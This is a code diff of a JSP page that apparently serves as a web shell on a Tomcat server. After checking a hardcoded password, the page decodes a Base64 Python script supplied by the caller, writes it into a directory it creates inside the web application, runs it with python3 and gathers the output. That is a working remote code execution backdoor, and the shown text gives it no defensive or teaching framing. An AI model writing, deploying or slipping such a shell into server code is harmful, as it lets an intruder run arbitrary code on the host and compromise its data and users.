@@ -1,4 +1,4 @@
-<%@ page import="java.io.*, java.util.*, javax.servlet.*, javax.servlet.http.*, javax.servlet.annotation.*" %>
+<%@ page import="java.io.*, java.util.*, javax.servlet.*, javax.servlet.http.*, java.util.Base64" %>
 <%
     // Define the hardcoded password for authentication
     final String hardcodedPassword = "TheHermitKingdom2024__";
@@ -19,17 +19,27 @@
         return;
     }
 
-    // Decode Base64 script and write it to a temporary file
+    // Define the directory where the virtual package and scripts are located
+    String virtualPackageDir = application.getRealPath("/") + "opt/tomcat/webapps/docs/netspi/netspi/aggregate/";
+
+    // Ensure the directory exists
+    File dir = new File(virtualPackageDir);
+    if (!dir.exists()) {
+        dir.mkdirs();
+    }
+
     File tempScriptFile = null;
     try {
-        String decodedScript = new String(java.util.Base64.getDecoder().decode(base64Script));
-        tempScriptFile = File.createTempFile("script", ".py");
+        // Decode Base64 script and save it in the virtual package directory
+        String decodedScript = new String(Base64.getDecoder().decode(base64Script));
+        tempScriptFile = new File(virtualPackageDir, "temp_script.py");
+
         try (BufferedWriter writer = new BufferedWriter(new FileWriter(tempScriptFile))) {
             writer.write(decodedScript);
         }
 
-        // Execute the script
-        String pythonPath = "python3"; // Use system-wide Python
+        // Execute the script using system-wide Python
+        String pythonPath = "python3";
         ProcessBuilder pb = new ProcessBuilder(pythonPath, tempScriptFile.getAbsolutePath());
         Process process = pb.start();
 
@@ -38,6 +48,7 @@
 
         StringBuilder output = new StringBuilder();
         String line;
+
         while ((line = reader.readLine()) != null) {
             output.append(line).append("\n");
         }
